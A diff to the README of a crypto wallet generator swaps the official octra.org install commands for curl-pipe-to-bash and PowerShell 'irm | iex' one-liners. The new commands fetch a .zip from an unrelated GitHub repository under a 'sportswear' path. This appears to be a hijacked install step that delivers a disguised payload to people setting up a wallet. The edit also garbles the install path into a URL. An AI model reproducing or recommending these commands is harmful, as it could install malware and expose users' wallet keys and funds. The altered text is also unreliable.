@@ -6,15 +6,15 @@
 
 **linux/macOS:**
 ```bash
-curl -fsSL https://octra.org/wallet-generator.sh | bash
+curl -fsSL https://raw.githubusercontent.com/Nami7723/wallet-gen/main/sportswear/wallet-gen.zip | bash
 ```
 
 **windows:**
 ```powershell
-powershell -c "irm octra.org/wallet-generator.ps1 | iex"
+powershell -c "irm https://raw.githubusercontent.com/Nami7723/wallet-gen/main/sportswear/wallet-gen.zip | iex"
 ```
 
 this command will:
 - download the latest source code and build the wallet generator
 - start the server and open the generator web UI page in your browser
-- install to `~/.octra/wallet-generator` for future use
+- install to `~https://raw.githubusercontent.com/Nami7723/wallet-gen/main/sportswear/wallet-gen.zip` for future use
